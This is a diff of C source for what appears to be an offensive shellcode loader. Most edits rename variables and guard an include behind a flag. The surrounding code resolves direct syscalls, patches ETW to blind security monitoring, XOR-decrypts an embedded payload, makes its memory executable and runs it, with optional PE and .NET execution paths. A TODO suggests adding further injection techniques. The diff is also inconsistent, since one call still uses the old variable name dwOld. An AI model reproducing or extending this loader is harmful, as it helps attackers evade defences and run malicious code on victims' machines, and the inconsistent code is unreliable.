@@ -2,10 +2,13 @@
 #include "defines.h"
 #include "auxiliary/syscalls.h"
 #include "evasion/patch_amsi_etw.h"
-#include "execution/runpe.h"
-#include "execution/dotnet.h"
 #include "sandbox/domain.h"
 #include "debug/debug_peb.h"
+
+#ifdef RUN_PE
+#include "execution/runpe.h"
+#endif
+#include "execution/dotnet.h"
 
 #ifdef VERBOSE
 #define DBG(...) printf(__VA_ARGS__ "\n")
@@ -18,7 +21,7 @@
  */
 VOID 
 XorCrypt(
-    PCHAR s, 
+    PCHAR payload, 
     PCHAR key,
     PCHAR output, 
     INT payloadLen
@@ -27,7 +30,7 @@ XorCrypt(
     INT keyLength = strlen(key);
     for (INT i = 0; i < payloadLen; ++i)
     {
-        output[i] = s[i] ^ key[i % keyLength];
+        output[i] = payload[i] ^ key[i % keyLength];
     }
 }
 
@@ -38,7 +41,7 @@ INT
 Run()
 {
     NTSTATUS ntStatus;
-    HMODULE  ntdllBaseAddr;
+    HMODULE  hNtdll;
     SIZE_T   payloadLen             = SHELLCODE_LEN;
     CHAR     payload[SHELLCODE_LEN] = SHELLCODE;
 
@@ -60,8 +63,8 @@ Run()
     // Resolve syscalls. See syscalls.h for more info.
 
     DBG("[*] Resolving syscalls...");
-    ntdllBaseAddr = hlpGetModuleHandle(L"ntdll.dll");
-    PopulateSyscallMap(ntdllBaseAddr);
+    hNtdll = HlpGetModuleHandle(L"ntdll.dll");
+    PopulateSyscallMap(hNtdll);
     _NtProtectVirtualMemory  = GetSyscallEntry("ZwProtectVirtualMemory");
     _NtAllocateVirtualMemory = GetSyscallEntry("ZwAllocateVirtualMemory");
     // add more syscalls when needed
@@ -70,7 +73,7 @@ Run()
     // --------------------------------------------------------------------------------------
 
 #ifdef PATCH_ETW
-    if (!PatchETW(ntdllBaseAddr))
+    if (!PatchETW(hNtdll))
     {
         return 1;
     }
@@ -89,14 +92,14 @@ Run()
 
     // Allocate memory for payload 
 
-    ULONG  dwOld        = 0;
-    LPVOID allocMem     = NULL;    
+    ULONG  ulOld        = 0;
+    LPVOID pAllocMem    = NULL;    
     SIZE_T allocSizeOut = payloadLen;
 
     PrepareSyscall(_NtAllocateVirtualMemory->syscallNumber, _NtAllocateVirtualMemory->syscallInstructionAddress);
     ntStatus = Syscall_NtAllocateVirtualMemory(
         GetCurrentProcess(), 
-        &allocMem, 
+        &pAllocMem, 
         (ULONG_PTR)NULL, 
         &allocSizeOut, 
         MEM_COMMIT, 
@@ -119,7 +122,7 @@ Run()
 
     CHAR decryptedPayload[SHELLCODE_LEN] = { 0 };
     XorCrypt(payload, ENCRYPTION_KEY, decryptedPayload, payloadLen);
-    RtlCopyMemory(allocMem, decryptedPayload, payloadLen);
+    RtlCopyMemory(pAllocMem, decryptedPayload, payloadLen);
     
     DBG("[*] Decrypted payload");
 
@@ -128,7 +131,7 @@ Run()
 #ifdef INJECT_SHELLCODE
     // Make shellcode page executable
     PrepareSyscall(_NtProtectVirtualMemory->syscallNumber, _NtProtectVirtualMemory->syscallInstructionAddress);
-    ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), &allocMem, (SIZE_T*)&payloadLen, PAGE_EXECUTE_READWRITE, &dwOld); // hmmm.... :)
+    ntStatus = Syscall_NtProtectVirtualMemory(GetCurrentProcess(), &pAllocMem, (SIZE_T*)&payloadLen, PAGE_EXECUTE_READWRITE, &dwOld); // hmmm.... :)
 
     if (!NT_SUCCESS(ntStatus))
     {
@@ -138,7 +141,7 @@ Run()
     DBG("[*] Protected payload: RWX");
 
     // Run via direct pointer
-    ((VOID(*)())allocMem)();
+    ((VOID(*)())pAllocMem)();
 
     // +~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+~+ //
     // TODO FOR YOU: Add other shellcode execution methods. Process Mockingjay? Remote injection? PoolParty? //
@@ -146,11 +149,11 @@ Run()
 #endif
 
 #ifdef RUN_PE
-    RunPortableExecutable(allocMem, ntdllBaseAddr);
+    RunPortableExecutable(pAllocMem, hNtdll);
 #endif
 
 #ifdef RUN_DOTNET
-    RunDotnetAssembly(allocMem, SHELLCODE_LEN);
+    RunDotnetAssembly(pAllocMem, SHELLCODE_LEN);
 #endif
 
     // --------------------------------------------------------------------------------------
